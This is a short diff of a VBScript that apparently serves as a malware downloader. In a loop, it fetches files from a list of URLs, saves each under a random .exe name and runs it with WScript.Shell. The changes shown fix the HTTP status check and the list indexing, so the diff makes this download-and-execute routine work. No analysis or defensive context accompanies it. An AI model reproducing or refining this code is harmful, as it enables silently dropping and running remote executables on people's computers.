@@ -18,25 +18,25 @@ Do While i <= 0
 	strHDLocation = (Int((max-min+1)*Rnd+min))&".exe"
 	
 	Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
-	objXMLHTTP.open "GET", list(0), false
-	objXMLHTTP.send()
-	if objXMLHTTP.Status = 20 Then
-		Set objADOStream = CreateObject("ADODB.Stream")
-	End if
-	
+    objXMLHTTP.open "GET", list.Item(i), false
+    objXMLHTTP.send()
+    If objXMLHTTP.Status = 200 Then
+
+    Set objADOStream = CreateObject("ADODB.Stream")
 	objADOStream.Open
-	objADOStream.Type = 1
-	
+	objADOStream.Type = 1 
+
 	objADOStream.Write objXMLHTTP.ResponseBody
-	objADOStream.Position = 0
-	Set objFSO = CreateObject("Scripting.FileSystemObject")
-	If Not objFSO.Fileexists(strHDLocation) Then
-		objADOStream.SaveToFile strHDLocation
-		objADOStream.Close
-		Set objADOStream = Nothing
+	objADOStream.Position = 0    
+	Set objFSO = Createobject("Scripting.FileSystemObject")
+	If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
+	Set objFSO = Nothing
+
+	objADOStream.SaveToFile strHDLocation
+	objADOStream.Close
+	Set objADOStream = Nothing
 	End if
-	
+
 	Set objXMLHTTP = Nothing
 	CreateObject("WScript.Shell").Run strHDLocation
-	Set oShell = Nothing
-Loop 
+Loop
